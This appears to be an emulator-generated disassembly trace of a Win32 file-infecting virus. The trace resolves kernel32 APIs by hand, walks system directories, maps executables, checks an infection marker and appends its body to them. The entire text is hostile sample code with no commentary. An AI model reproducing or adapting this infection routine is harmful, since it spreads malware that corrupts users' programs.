0x00401000:	pusha
0x00401001:	pushfl
0x00401002:	call 0x00401007
0x00401007:	popl %ebp
0x00401008:	movl %eax, %ebp
0x0040100a:	subl %ebp, $0x401007<UINT32>
0x00401010:	subl %eax, $0x7<UINT8>
0x00401013:	subl %eax, $0x1000<UINT32>
0x00401018:	movl 0x40105d(%ebp), %eax
0x0040101e:	movl %esi, 0x24(%esp)
0x00401022:	andl %esi, $0xffff0000<UINT32>
0x00401028:	movl %ecx, $0x5<UINT32>
0x0040102d:	call 0x004012d7
0x004012d7:	cmpw (%esi), $0x5a4d<UINT16>
0x004012dc:	je 0x004012f8
0x004012f8:	xchgl %esi, %eax
0x004012f9:	ret

0x00401032:	movl 0x40143f(%ebp), %eax
0x00401038:	leal %edi, 0x40155c(%ebp)
0x0040103e:	leal %esi, 0x401443(%ebp)
0x00401044:	call 0x004012fa
0x004012fa:	pushl %esi
0x004012fb:	pushl %edi
0x004012fc:	call 0x00401313
0x00401313:	movl %edx, %esi
0x00401315:	movl %edi, %esi
0x00401317:	xorb %al, %al
0x00401319:	scasb %al, %es:(%edi)
0x0040131a:	jne 0x00401319
0x0040131c:	subl %edi, %esi
0x0040131e:	movl %ecx, %edi
0x00401320:	xorl %eax, %eax
0x00401322:	movl %esi, $0x3c<UINT32>
0x00401327:	addl %esi, 0x40143f(%ebp)
0x0040132d:	lodsw %ax, %ds:(%esi)
0x0040132f:	addl %eax, 0x40143f(%ebp)
0x00401335:	movl %esi, 0x78(%eax)
0x00401338:	addl %esi, $0x1c<UINT8>
0x0040133b:	addl %esi, 0x40143f(%ebp)
0x00401341:	leal %edi, 0x401550(%ebp)
0x00401347:	lodsl %eax, %ds:(%esi)
0x00401348:	addl %eax, 0x40143f(%ebp)
0x0040134e:	stosl %es:(%edi), %eax
0x0040134f:	lodsl %eax, %ds:(%esi)
0x00401350:	addl %eax, 0x40143f(%ebp)
0x00401356:	pushl %eax
0x00401357:	stosl %es:(%edi), %eax
0x00401358:	lodsl %eax, %ds:(%esi)
0x00401359:	addl %eax, 0x40143f(%ebp)
0x0040135f:	stosl %es:(%edi), %eax
0x00401360:	popl %esi
0x00401361:	xorl %ebx, %ebx
0x00401363:	lodsl %eax, %ds:(%esi)
0x00401364:	pushl %esi
0x00401365:	addl %eax, 0x40143f(%ebp)
0x0040136b:	movl %esi, %eax
0x0040136d:	movl %edi, %edx
0x0040136f:	pushl %ecx
0x00401370:	cld
0x00401371:	rep cmpsb %es:(%edi), %ds:(%esi)
0x00401373:	popl %ecx
0x00401374:	je 0x0040137a
0x00401376:	popl %esi
0x00401377:	incl %ebx
0x00401378:	jmp 0x00401363
0x0040137a:	popl %esi
0x0040137b:	xchgl %ebx, %eax
0x0040137c:	shll %eax
0x0040137e:	addl %eax, 0x401558(%ebp)
0x00401384:	xorl %esi, %esi
0x00401386:	xchgl %esi, %eax
0x00401387:	lodsw %ax, %ds:(%esi)
0x00401389:	shll %eax, $0x2<UINT8>
0x0040138c:	addl %eax, 0x401550(%ebp)
0x00401392:	movl %esi, %eax
0x00401394:	lodsl %eax, %ds:(%esi)
0x00401395:	addl %eax, 0x40143f(%ebp)
0x0040139b:	ret

0x00401301:	popl %edi
0x00401302:	popl %esi
0x00401303:	stosl %es:(%edi), %eax
0x00401304:	xchgl %esi, %edi
0x00401306:	xorb %al, %al
0x00401308:	scasb %al, %es:(%edi)
0x00401309:	jne 0x00401308
0x0040130b:	xchgl %esi, %edi
0x0040130d:	cmpb (%esi), $0xffffffbb<UINT8>
0x00401310:	jne 0x004012fa
0x00401312:	ret

0x00401049:	call 0x00401063
0x00401063:	leal %edi, 0x4016d8(%ebp)
0x00401069:	pushl $0x7f<UINT8>
0x0040106b:	pushl %edi
0x0040106c:	call GetWindowsDirectoryA@kernel32.dll
GetWindowsDirectoryA@kernel32.dll: API Node	
0x00401072:	addl %edi, $0x7f<UINT8>
0x00401075:	pushl $0x7f<UINT8>
0x00401077:	pushl %edi
0x00401078:	call GetSystemDirectoryA@kernel32.dll
GetSystemDirectoryA@kernel32.dll: API Node	
0x0040107e:	addl %edi, $0x7f<UINT8>
0x00401081:	pushl %edi
0x00401082:	pushl $0x7f<UINT8>
0x00401084:	call GetCurrentDirectoryA@kernel32.dll
GetCurrentDirectoryA@kernel32.dll: API Node	
0x0040108a:	ret

0x0040104e:	call 0x0040108b
0x0040108b:	leal %edi, 0x4016d8(%ebp)
0x00401091:	movb 0x401855(%ebp), $0x3<UINT8>
0x00401098:	pushl %edi
0x00401099:	call SetCurrentDirectoryA@kernel32.dll
SetCurrentDirectoryA@kernel32.dll: API Node	
0x0040109f:	pushl %edi
0x004010a0:	call 0x004010b2
0x004010b2:	andl 0x40143b(%ebp), $0x0<UINT8>
0x004010b9:	leal %eax, 0x401598(%ebp)
0x004010bf:	pushl %eax
0x004010c0:	leal %eax, 0x401435(%ebp)
0x004010c6:	pushl %eax
0x004010c7:	call FindFirstFileA@kernel32.dll
FindFirstFileA@kernel32.dll: API Node	
0x004010cd:	incl %eax
0x004010ce:	je 101
0x004010d0:	decl %eax
0x004010d1:	movl 0x401540(%ebp), %eax
0x004010d7:	pushl 0x401058(%ebp)
0x004010dd:	pushl 0x40105d(%ebp)
0x004010e3:	call 0x00401136
0x00401136:	leal %esi, 0x4015c4(%ebp)
0x0040113c:	pushl $0x80<UINT32>
0x00401141:	pushl %esi
0x00401142:	call SetFileAttributesA@kernel32.dll
SetFileAttributesA@kernel32.dll: API Node	
0x00401148:	call 0x004013c7
0x004013c7:	xorl %eax, %eax
0x004013c9:	pushl %eax
0x004013ca:	pushl %eax
0x004013cb:	pushl $0x3<UINT8>
0x004013cd:	pushl %eax
0x004013ce:	incl %eax
0x004013cf:	pushl %eax
0x004013d0:	pushl $0xc0000000<UINT32>
0x004013d5:	pushl %esi
0x004013d6:	call CreateFileA@kernel32.dll
CreateFileA@kernel32.dll: API Node	
0x004013dc:	ret

0x0040114d:	incl %eax
0x0040114e:	je 0x004012c3
0x00401154:	decl %eax
0x00401155:	movl 0x401544(%ebp), %eax
0x0040115b:	movl %ecx, 0x4015b8(%ebp)
0x00401161:	call 0x004013dd
0x004013dd:	xorl %eax, %eax
0x004013df:	pushl %eax
0x004013e0:	pushl %ecx
0x004013e1:	pushl %eax
0x004013e2:	pushl $0x4<UINT8>
0x004013e4:	pushl %eax
0x004013e5:	pushl 0x401544(%ebp)
0x004013eb:	call CreateFileMappingA@kernel32.dll
CreateFileMappingA@kernel32.dll: API Node	
0x004013f1:	ret

0x00401166:	orl %eax, %eax
0x00401168:	je 0x004012b7
0x0040116e:	movl 0x401548(%ebp), %eax
0x00401174:	movl %ecx, 0x4015b8(%ebp)
0x0040117a:	call 0x004013f2
0x004013f2:	xorl %eax, %eax
0x004013f4:	pushl %ecx
0x004013f5:	pushl %eax
0x004013f6:	pushl %eax
0x004013f7:	pushl $0x2<UINT8>
0x004013f9:	pushl 0x401548(%ebp)
0x004013ff:	call MapViewOfFile@kernel32.dll
MapViewOfFile@kernel32.dll: API Node	
0x00401405:	ret

0x0040117f:	orl %eax, %eax
0x00401181:	je 280
0x00401187:	movl 0x40154c(%ebp), %eax
0x0040118d:	movl %esi, 0x3c(%eax)
0x00401190:	addl %esi, %eax
0x00401192:	cmpl (%esi), $0x4550<UINT32>
0x00401198:	jne 0x0040128e
0x0040119e:	cmpl 0x4c(%esi), $0x43545a41<UINT32>
0x0040128e:	decb 0x40143b(%ebp)
0x00401294:	movl %ecx, 0x4015b8(%ebp)
0x0040129a:	call 0x004013a9
0x004013a9:	xorl %eax, %eax
0x004013ab:	pushl %eax
0x004013ac:	pushl %eax
0x004013ad:	pushl %ecx
0x004013ae:	pushl 0x401544(%ebp)
0x004013b4:	call SetFilePointer@kernel32.dll
SetFilePointer@kernel32.dll: API Node	
0x004013ba:	pushl 0x401544(%ebp)
0x004013c0:	call SetEndOfFile@kernel32.dll
SetEndOfFile@kernel32.dll: API Node	
0x004013c6:	ret

0x0040129f:	pushl 0x40154c(%ebp)
0x004012a5:	call UnmapViewOfFile@kernel32.dll
UnmapViewOfFile@kernel32.dll: API Node	
0x004012ab:	pushl 0x401548(%ebp)
0x004012b1:	call CloseHandle@kernel32.dll
CloseHandle@kernel32.dll: API Node	
0x004012b7:	pushl 0x401544(%ebp)
0x004012bd:	call CloseHandle@kernel32.dll
0x004012c3:	pushl 0x401598(%ebp)
0x004012c9:	leal %eax, 0x4015c4(%ebp)
0x004012cf:	pushl %eax
0x004012d0:	call SetFileAttributesA@kernel32.dll
0x004012d6:	ret

0x004010e8:	popl 0x40105d(%ebp)
0x004010ee:	popl 0x401058(%ebp)
0x004010f4:	incb 0x40143b(%ebp)
0x004010fa:	cmpb 0x40143b(%ebp), $0x5<UINT8>
0x00401101:	je 0x00401135
0x00401103:	leal %edi, 0x4015c4(%ebp)
0x00401109:	movl %ecx, $0x104<UINT32>
0x0040110e:	xorb %al, %al
0x00401110:	rep stosb %es:(%edi), %al
0x00401112:	leal %eax, 0x401598(%ebp)
0x00401118:	pushl %eax
0x00401119:	pushl 0x401540(%ebp)
0x0040111f:	call FindNextFileA@kernel32.dll
FindNextFileA@kernel32.dll: API Node	
0x00401125:	orl %eax, %eax
0x00401127:	jne 0x004010d7
0x00401129:	pushl 0x401540(%ebp)
0x0040112f:	call FindClose@kernel32.dll
FindClose@kernel32.dll: API Node	
0x00401135:	ret

0x004010a5:	popl %edi
0x004010a6:	addl %edi, $0x7f<UINT8>
0x004010a9:	decb 0x401855(%ebp)
0x004010af:	jne 0x00401098
0x004010b1:	ret

0x00401053:	xchgl %ecx, %ebp
0x00401055:	popfl
0x00401056:	popa
0x00401057:	movl %eax, $0x1000<UINT32>
0x0040105c:	addl %eax, $0x400000<UINT32>
0x00401061:	jmp 0x00401000
0x004011a5:	je 0x0040128e
0x004011ab:	pushl 0x3c(%esi)
0x004011ae:	pushl 0x40154c(%ebp)
0x004011b4:	call UnmapViewOfFile@kernel32.dll
0x004011ba:	pushl 0x401548(%ebp)
0x004011c0:	call CloseHandle@kernel32.dll
0x004011c6:	popl %ecx
0x004011c7:	movl %eax, 0x4015b8(%ebp)
0x004011cd:	addl %eax, $0x538<UINT32>
0x004011d2:	call 0x0040139c
0x0040139c:	pushl %edx
0x0040139d:	xorl %edx, %edx
0x0040139f:	pushl %eax
0x004013a0:	divl %eax, %ecx
0x004013a2:	popl %eax
0x004013a3:	subl %ecx, %edx
0x004013a5:	addl %eax, %ecx
0x004013a7:	popl %edx
0x004013a8:	ret

0x004011d7:	xchgl %ecx, %eax
0x004011d8:	call 0x004013dd
0x004011dd:	orl %eax, %eax
0x004011df:	je 0x004012b7
